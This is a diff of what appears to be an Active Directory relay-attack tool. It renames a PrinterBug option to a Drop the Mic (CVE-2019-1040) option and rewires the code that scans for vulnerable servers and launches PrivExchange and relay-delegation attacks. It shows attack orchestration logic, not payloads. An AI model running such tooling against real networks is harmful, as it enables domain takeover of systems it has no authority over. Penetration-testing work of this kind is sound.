@@ -23,7 +23,7 @@ def parse_args(args):
     parser.add_argument("-dc", "--domain-controller",
                         help="Domain controller for Drop the Mic and PrivExchange attacks")
     parser.add_argument("--privexchange", action="store_true", help="Perform PrivExchange attack")
-    parser.add_argument("--printerbug", action="store_true", help="Perform printerbug attack")
+    parser.add_argument("--remove-mic", action="store_true", help="Perform Drop the Mic attack")
     parser.add_argument("--httpattack", action="store_true", help="Perform PrivExchange without authentication")
     parser.add_argument("--delegate", action="store_true", help="Perform relay delegation attack with mitm6")
     parser.add_argument("--delegate-dc", action="store_true",
@@ -54,7 +54,7 @@ def parse_hostlist(hostlist):
 
     return hosts
 
-def parse_printerbug_scan(proc):
+def parse_mic_scan(proc):
     hosts = []
     for l in proc.stdout:
         if "is VULNERABLE" in l:
@@ -68,19 +68,19 @@ def user_attacks(args, local_ip):
     scan = None
 
     # PrinterBug
-    if args.printerbug or args.delegate_dc:
-        print_info("Testing servers for CVE-2019-1040 (PrinterBug)")
-        scan = start_printerbug_scan(args)
-        vuln_hosts = parse_printerbug_scan(scan)
+    if args.remove_mic or args.delegate_dc:
+        print_info("Testing servers for CVE-2019-1040 (Drop the Mic)")
+        scan = start_mic_scan(args)
+        vuln_hosts = parse_mic_scan(scan)
 
         if len(vuln_hosts) > 0:
             server = vuln_hosts[0]
-            printerbug = start_printerbug(args.user, server, local_ip)
+            printerbug = start_printerbug(args, server, local_ip)
 
             return printerbug, privexchange, scan
 
         else:
-            print_bad("No servers found vulnerable to PrinterBug")
+            print_bad("No servers found vulnerable to Drop the Mic")
             sys.exit()
 
     # PrivExchange
@@ -122,7 +122,7 @@ async def relay_attacks(args, iface):
 def check_args(args):
     msg = None
 
-    if args.privexchange or args.printerbug:
+    if args.privexchange or args.remove_mic:
         if not any([args.server, args.server_file]) or not args.user or not args.domain_controller:
             msg = ("PrivExchange and PrinterBug attacks require: -s <server to attack> "
                       "-u <DOM/user:password> -dc <domain controller IP/hostname>")
@@ -195,7 +195,7 @@ async def main():
         print_bad(str(e))
         sys.exit()
 
-    if any([args.privexchange, args.printerbug, args.delegate_dc]):
+    if any([args.privexchange, args.remove_mic, args.delegate_dc]):
         printerbug, privexchange, scan = user_attacks(args, local_ip)
         procs.append(printerbug)
         procs.append(privexchange)
